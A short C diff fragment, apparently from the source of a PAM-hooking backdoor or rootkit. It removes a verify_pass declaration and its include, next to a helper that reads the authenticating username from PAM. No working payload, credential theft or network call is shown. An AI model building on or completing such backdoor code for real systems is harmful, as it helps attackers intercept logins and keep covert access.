@@ -37,10 +37,6 @@ int bd_sshproc(void);
 
 /* if PAM is being used... */
 #if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
-
-int verify_pass(char *user, char *acc_pass);
-#include "verify_pass.c"
-
 char *get_username(const pam_handle_t *pamh){
     void *u = NULL;
     if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
